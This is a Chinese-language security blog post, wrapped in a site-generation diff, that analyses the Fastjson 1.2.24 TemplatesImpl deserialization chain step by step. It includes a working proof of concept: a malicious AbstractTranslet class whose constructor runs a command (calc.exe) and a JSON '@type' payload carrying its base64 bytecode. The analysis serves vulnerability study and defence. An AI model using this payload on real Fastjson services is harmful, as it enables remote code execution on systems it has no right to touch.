@@ -1,0 +1,91 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=HandheldFriendly content="True"><meta http-equiv=x-ua-compatible content="IE=edge"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=generator content="Hugo 0.101.0"><link rel=apple-touch-icon sizes=180x180 href=https://zrquan.github.io/blog/favicon/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://zrquan.github.io/blog/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://zrquan.github.io/blog/favicon/favicon-16x16.png><link rel=manifest href=https://zrquan.github.io/blog/favicon/site.webmanifest><link rel=mask-icon href=https://zrquan.github.io/blog/favicon/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>Fastjson 1.2.24 TemplatesImpl利用链 - zrquan</title><meta name=author content="zrquan"><meta name=description content="A minimal Hugo theme with nice theme color."><meta name=keywords content="fastjson,java"><meta property="og:title" content="Fastjson 1.2.24 TemplatesImpl利用链"><meta name=twitter:title content="Fastjson 1.2.24 TemplatesImpl利用链"><meta property="og:type" content="article"><meta property="og:url" content="https://zrquan.github.io/blog/posts/fastjson/"><meta property="og:description" content="Fastjson 是 alibaba 的一款开源 JSON 解析库，可以将 Java 对象和 JSON 字符串相互转化，并提供了 autotype 机制让使用者可以解析任意 Java 对象，导致一些存在利用点的类被用来进行反序列化攻击。"><meta name=twitter:description content="Fastjson 是 alibaba 的一款开源 JSON 解析库，可以将 Java 对象和 JSON 字符串相互转化，并提供了 autotype 机制让使用者可以解析任意 Java 对象，导致一些存在利用点的类被用来进行反序列化攻击。"><meta property="og:image" content="https://zrquan.github.io/img/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://zrquan.github.io/img/og.png"><meta property="article:published_time" content="2021-04-12T00:00:00+08:00"><meta property="article:modified_time" content="2021-04-12T00:00:00+08:00"><style>@media(prefers-color-scheme:dark){body[data-theme=auto] img{filter:brightness(60%)}}body[data-theme=dark] img{filter:brightness(60%)}</style><link rel=stylesheet href=https://zrquan.github.io/blog/assets/css/fuji.min.css></head><body data-theme=auto data-theme-auto=false><script data-cfasync=false>var fujiThemeData=localStorage.getItem("fuji_data-theme");fujiThemeData?fujiThemeData!=="auto"&&document.body.setAttribute("data-theme",fujiThemeData==="dark"?"dark":"light"):localStorage.setItem("fuji_data-theme","auto")</script><header><div class="container-lg clearfix"><div class="col-12 header"><a class=title-main href=https://zrquan.github.io/blog>zrquan</a>
+<span class=title-sub>每一个平凡的日常，也许就是连续发生的奇迹</span></div></div></header><main><div class="container-lg clearfix"><div class="col-12 col-md-9 float-left content"><article><h2 class="post-item post-title"><a href=https://zrquan.github.io/blog/posts/fastjson/>Fastjson 1.2.24 TemplatesImpl利用链</a></h2><div class="post-item post-meta"><span><i class="iconfont icon-today-sharp"></i>&nbsp;2021-04-12</span>
+<span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;1755 words</span>
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href=https://zrquan.github.io/blog/tags/fastjson>fastjson</a>&nbsp;<a href=https://zrquan.github.io/blog/tags/java>java</a>&nbsp;</span></div><div class="post-content markdown-body"><p>Fastjson 是 alibaba 的一款开源 JSON 解析库，可以将 Java 对象和 JSON 字符串相互转化，并提供了 autotype 机制让使用者可以解析任意 Java 对象，导致一些存在利用点的类被用来进行反序列化攻击。</p><h2 id=templatesimpl-利用链>TemplatesImpl 利用链</h2><p>这个类存在利用点的方法是 getTransletInstance，关键的代码如下：</p><pre><code class=language-java>if (_name == null) return null;
+
+if (_class == null) defineTransletClasses();
+
+// The translet needs to keep a reference to all its auxiliary
+// class to prevent the GC from collecting them
+AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
+...
+</code></pre><p>首先是 <code>_name</code> 变量不能为空，不然直接返回 null。</p><p>这里的 <code>_class</code> 数组用来保存辅助类，避免垃圾收集器将它们销毁，并通过 newInstance 方法将主类初始化赋值给 translet 变量。前面判断当 <code>_class</code> 数组为空时会执行
+defineTransletClasses 方法，我们跟进分析一下。</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-11_13-55-39_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-11_13-55-39_screenshot.png></figure><p>这个方法主要是将 <code>_bytecodes</code> 的字节码提取出来，并调用 <code>loader.defineClass</code> 方法生成各个辅助类的 Class 对象保存到 <code>_class</code> 数组中。注意上图的两个红框部分——在创建 loader
+时需要调用 <code>_tfactory</code> 私有变量中的方法，如果变量是空的话会报错，所以构造 poc 时需要随便设一个初始值；为了将当前的类设为主类使它初始化，需要这个类继承
+AbstractTranslet 类。</p><p>综上我们可以构造一个 AbstractTranslet 的子类保存到 <code>_bytecodes</code> 中，在它的构造方法写入命令，当这个恶意类被初始化时命令就会执行。</p><pre><code class=language-java>public class EvilObject extends AbstractTranslet {
+    public EvilObject() throws IOException {
+        Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
+}
+</code></pre><p>为了调用 getTransletInstance 方法，我们需要从 getOutputProperties 方法进入，它是私有变量 <code>_outputProperties</code> 的 getter 方法，会在 Fastjson 反序列化的过程中执行。调用栈如下：</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-11_15-01-58_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-11_15-01-58_screenshot.png></figure><h2 id=fastjson-解析过程>Fastjson 解析过程</h2><p>通过下面的示例代码，构造恶意 TemplatesImpl 类的 JSON 字符串，调用 JSON#parse 方法进行反序列化：</p><pre><code class=language-java>public class TemplatesImplPoc {
+    public static String getBytecodes(String classPath) throws IOException {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        Files.copy(Paths.get(classPath), out);
+        return Base64.getEncoder().encodeToString(out.toByteArray());
+    }
+
+    public static void main(String[] args) throws Exception {
+        final String evilClassPath = System.getProperty(&quot;user.dir&quot;) + &quot;\\target\\classes\\EvilObject.class&quot;;
+        String evilCode = getBytecodes(evilClassPath);
+        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+        String poc = &quot;{\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS + &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot; + evilCode + &quot;\&quot;],'_name':'a.b','_tfactory':{},\&quot;_outputProperties\&quot;:{}}&quot;;
+        JSON.parse(poc, Feature.SupportNonPublicField);
+    }
+}
+</code></pre><p>首先编译恶意类得到 class 文件，读取文件内容并且 base64 编码后写到 <code>_bytecodes</code> 数组中，
+<code>@type</code> 指定反序列化 json 字符串的目标类型。然后初始化了一些属性，这些属性的作用在前面有解释，由于要设置私有属性，反序列化时需要开启 SupportNonPublicField 选项才能利用成功。</p><p>一直跟进到 DefaultJSONParser#parseObject 方法，创建 DefaultJSONParser 对象时初始化了
+ParserConfig、JSONScanner 等重要类的实例。</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-11_23-57-31_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-11_23-57-31_screenshot.png></figure><p>Fastjson 1.2.24 还没有引入 checkAutotype 安全机制，黑名单中只要两个线程类。</p><p>识别到 <code>@type</code> 关键字后，会从值中读取类名并获取 Class 对象，然后调用
+ParserConfig#getDeserializer 方法获取解析器。</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-12_00-09-51_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-12_00-09-51_screenshot.png></figure><p>在 getDeserializer 方法中对类名进行一些检查，看看是否在 denyList 中，或者是不是一些特殊的类。</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-12_00-15-10_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-12_00-15-10_screenshot.png></figure><p>如果一直找不到解析器，就会执行 createJavaBeanDeserializer 方法创建。跟进到
+JavaBeanInfo#build 方法：</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-12_01-11-59_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-12_01-11-59_screenshot.png></figure><p>通过反射获取 TemplatesImpl 类的公共属性、方法和构造器，然后遍历公共方法将 setter 和对应的属性信息添加到 fieldList 中。</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-12_01-33-44_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-12_01-33-44_screenshot.png></figure><p>在方法最后又对 methods 进行了一次遍历，这次将关键的 getOutputProperties 方法添加到
+fieldList 中。</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-12_01-42-44_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-12_01-42-44_screenshot.png></figure><p>可以看到方法需要满足一些条件，首先是 if 语句中条件：</p><pre><code class=language-java>// 1.方法名长度大于4
+methodName.length() &gt;= 4 &amp;&amp;
+// 2.不能是静态方法
+!Modifier.isStatic(method.getModifiers()) &amp;&amp;
+// 3.以get开头
+methodName.startsWith(&quot;get&quot;) &amp;&amp;
+// 4.第四个字符是大写
+Character.isUpperCase(methodName.charAt(3)) &amp;&amp;
+// 5.不能有参数
+method.getParameterTypes().length == 0 &amp;&amp;
+// 6.返回值继承于Collection||Map||AtomicBoolean||AtomicInteger||AtomicLong
+(Collection.class.isAssignableFrom(method.getReturnType()) ||
+ Map.class.isAssignableFrom(method.getReturnType()) ||
+ AtomicBoolean.class == method.getReturnType() ||
+ AtomicInteger.class == method.getReturnType() ||
+ AtomicLong.class == method.getReturnType())
+</code></pre><p>然后是属性不能在 fieldList 中，也就是刚刚添加 setter 时没有该属性的 setter。</p><p>最后返回解析器并执行它的 deserialze 方法，解析器的 sortedFieldDeserializers 属性封装了 getOutputProperties 方法。</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-12_03-12-20_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-12_03-12-20_screenshot.png></figure><p>依次处理完 bytecodes、name 和 tfactory 三个属性后开始处理 outputProperties，我们跟进到 JavaBeanDeserializer#parseField 方法，该方法获取属性的解析器对其进行处理。</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-12_02-57-52_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-12_02-57-52_screenshot.png></figure><p>从上图看到通过 smartMatch 方法获取 outputProperties 属性的解析器，但是参数前面是带有下划线的(之前三个属性也是)。不过 smartMatch 方法会将参数中的 <code>-</code> 和 <code>_</code> 忽略：</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-12_03-02-20_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-12_03-02-20_screenshot.png></figure><p>然后跟进到 FieldDeserializer#setValue 方法，在为参数(outputProperties)赋值时从
+fieldInfo 获取对应的 method 并调用 invoke 方法执行。</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-12_03-18-34_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-12_03-18-34_screenshot.png></figure><p>就这样 Fastjson 的反序列化过程和 TemplatesImpl 的利用链成功适配，导致命令执行。</p><p>我们再回过头看看 bytecodes 参数的解析过程，Fastjson 根据属性的类型(字节数组)获取对应的解析器 ObjectArrayCodec，读取其内容时调用 JSONScanner#bytesValue 方法进行 base64
+解码：</p><figure><img src=https://zrquan.github.io/blog/ox-hugo/2021-04-12_15-04-21_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-04-12_15-04-21_screenshot.png></figure><pre><code class=language-java>public byte[] bytesValue() {
+    return IOUtils.decodeBase64(this.text, this.np + 1, this.sp);
+}
+</code></pre><p>所以 poc 中 bytecodes 的值要进行编码处理。</p><h2 id=总结>总结</h2><p>Fastjson 1.2.24 中 autotype 是默认开启的，而且没有 checkAutotype 方法，所以攻击难度相对较低，在 1.2.25 后基本是针对 checkAutotype 的各种绕过了。但
+TemplatesImpl 利用链中需要设置一些私有属性，需要 Fastjson 开启
+SupportNonPublicField 选项，而这个选项是在 1.2.22 版本引入的。</p><p>Fastjson 还提供了几个 parseObject 方法来解析 JSON 字符串，不过最后和本文的示例一样都会执行到 DefaultJSONParser#parse，不影响 TemplatesImpl 利用链。</p><p>Fastjson 解析 JSON 字符串时，会调用反序列化对象的公共 setter 和构造函数，还有符合一定条件的 getter，TemplatesImpl 利用链就是用到了 getter 方法中的漏洞。</p></div></article><div class="license markdown-body"><blockquote><p>Unless otherwise noted, the content of this site is licensed under <a rel=license href=http://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a>.</p></blockquote></div><div class=post-comment data-comment=disqus><span class=post-comment-notloaded><i class="iconfont icon-chatbox-ellipses-sharp"></i>&nbsp;Load comments</span><div id=disqus_thread style=display:none></div><script>function loadComment(){var t=document.querySelector(".post-comment"),n=function(){this.page.url="https://zrquan.github.io/blog/posts/fastjson/",this.page.identifier="fastjson"},e=document.createElement("script");e.src="https://4shen0ne.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),document.querySelector("#disqus_thread").removeAttribute("style"),(document.body||document.head).appendChild(e),document.querySelector("span.post-comment-notloaded").setAttribute("style","display: none;")}</script></div></div><aside class="col-12 col-md-3 float-left sidebar"><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=https://zrquan.github.io/blog/>Home</a></li><li><a href=https://zrquan.github.io/blog/archives/>Archives</a></li><li><a href=https://zrquan.github.io/blog/search/>Search</a></li><li><a href=https://zrquan.github.io/blog/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-links"><h3>Links</h3><ul><li><a href=https://github.com/zrquan target=_blank><span>GitHub</span></a></li></ul></div><div class="sidebar-item sidebar-tags"><h3>Tags</h3><div><span><a href=https://zrquan.github.io/blog/tags/cve/>cve</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/deserialize/>deserialize</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/emacs/>emacs</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/fastjson/>fastjson</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/java/>java</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/kotlin/>kotlin</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/org-mode/>org-mode</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/web/>web</a></span></div></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#templatesimpl-利用链>TemplatesImpl 利用链</a></li><li><a href=#fastjson-解析过程>Fastjson 解析过程</a></li><li><a href=#总结>总结</a></li></ul></nav></div></aside></div><div class=btn><div class=btn-menu id=btn-menu><i class="iconfont icon-grid-sharp"></i></div><div class=btn-toggle-mode><i class="iconfont icon-contrast-sharp"></i></div><div class=btn-scroll-top><i class="iconfont icon-chevron-up-circle-sharp"></i></div></div><aside class=sidebar-mobile style=display:none><div class=sidebar-wrapper><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=https://zrquan.github.io/blog/>Home</a></li><li><a href=https://zrquan.github.io/blog/archives/>Archives</a></li><li><a href=https://zrquan.github.io/blog/search/>Search</a></li><li><a href=https://zrquan.github.io/blog/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-links"><h3>Links</h3><ul><li><a href=https://github.com/zrquan target=_blank><span>GitHub</span></a></li></ul></div><div class="sidebar-item sidebar-tags"><h3>Tags</h3><div><span><a href=https://zrquan.github.io/blog/tags/cve/>cve</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/deserialize/>deserialize</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/emacs/>emacs</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/fastjson/>fastjson</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/java/>java</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/kotlin/>kotlin</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/org-mode/>org-mode</a></span>
+<span><a href=https://zrquan.github.io/blog/tags/web/>web</a></span></div></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#templatesimpl-利用链>TemplatesImpl 利用链</a></li><li><a href=#fastjson-解析过程>Fastjson 解析过程</a></li><li><a href=#总结>总结</a></li></ul></nav></div></div></aside></main><footer><div class="container-lg clearfix"><div class="col-12 footer"><span>&copy; 2021-2022
+<a href=https://zrquan.github.io/blog>zrquan</a>
+| <a href=https://github.com/zrquan/blog>Source code</a>
+| Powered by <a href=https://github.com/dsrkafuu/hugo-theme-fuji/ target=_blank>Fuji-v2</a> & <a href=https://gohugo.io/ target=_blank>Hugo</a></span></div></div></footer><script defer src=https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.0/lazysizes.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js></script>
+<script defer src=https://zrquan.github.io/blog/assets/js/fuji.min.js></script>
+<script async src=https://unpkg.com/mermaid@8.2.3/dist/mermaid.min.js></script></body></html>
